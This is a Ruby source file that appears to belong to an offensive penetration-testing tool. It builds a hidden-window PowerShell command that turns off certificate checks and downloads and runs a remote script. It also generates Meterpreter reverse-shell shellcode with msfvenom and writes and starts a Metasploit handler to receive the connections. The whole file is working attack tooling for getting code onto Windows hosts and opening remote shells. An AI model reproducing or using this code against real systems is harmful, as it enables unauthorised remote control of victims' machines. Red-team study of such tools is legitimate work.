#!/usr/bin/env ruby
# Thanks to:
# @mattifestation, @obscuresec, and @HackingDave
require 'socket'
require 'openssl'
require 'readline'
module MainCommands
  def print_error(text)
    print "\e[31;1m[-]\e[0m #{text}"
  end

  def print_info(text)
    print "\e[34;1m[*]\e[0m #{text}"
  end

  def print_success(text)
    print "\e[32;1m[+]\e[0m #{text}"
  end

  def get_input(prompt = '', default = '')
    choice = Readline.readline(prompt, false)
    choice = default if choice == ''
    choice
  end

  def file_root
    File.expand_path(File.dirname($PROGRAM_NAME))
  end

  def cert_dir
    file_root + '/certs/'
  end

  def ssl_setup(host, port)
    tcp_server = TCPServer.new(host, port)
    ctx = OpenSSL::SSL::SSLContext.new
    crt = "#{cert_dir}server.crt"
    ctx.cert = OpenSSL::X509::Certificate.new(File.open(crt))
    ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
    server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
    server
  end

  def powershell_command(url)
    cmd = 'powershell -windowstyle hidden "[System.Net.ServicePointManager]::'
    cmd << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
    cmd << "Net.WebClient).DownloadString('#{url}')\""
    print_info("Run this from CMD\n")
    puts cmd
  end

  trap('INT') do
    print_info("Caught CTRL-C Shutting Down!\n")
    exit
  end
end
module MsfCommands
  def available_payloads(payload)
    payloads = { :'1' => 'windows/meterpreter/reverse_https',
                 :'2' => 'windows/meterpreter/reverse_tcp' }
    payloads[:"#{payload}"]
  end

  def msf_path
    if File.exist?('/usr/bin/msfvenom')
      @msf_path = '/usr/bin/'
    elsif File.exist?('/opt/metasploit-framework/msfvenom')
      @msf_path = ('/opt/metasploit-framework/')
    else
      print_error("Metasploit Not Found!\n")
      exit
    end
  end

  def generate_shellcode(host, port, payload)
    msf_path
    print_info("Generating shellcode\n")
    msfcmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
    msfcmd << "LPORT=#{port} -f c"
    execute  = `#{msfcmd} 2> /dev/null`
    print_success("Shellcode Generated\n")
    shellcode = clean_shellcode(execute)
    shellcode
  end

  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..18] = ''
    shellcode
  end

  def metasploit_setup(host, port, payload)
    msf_path
    unless Dir.exist?(file_root + '/metaspoit_files/')
      Dir.mkdir(file_root + '/metaspoit_files/')
    end
    file_path = file_root + '/metaspoit_files/'
    rc_file = 'msf_listener.rc'
    write_rc(file_path, rc_file, payload, host, port)
    print_info("Setting up Metasploit this may take a moment\n")
    system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
  end

  def write_rc(file_path, rc_file, payload, host, port)
    file = File.open("#{file_path}#{rc_file}", 'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write('exploit -j')
    file.close
  end
end
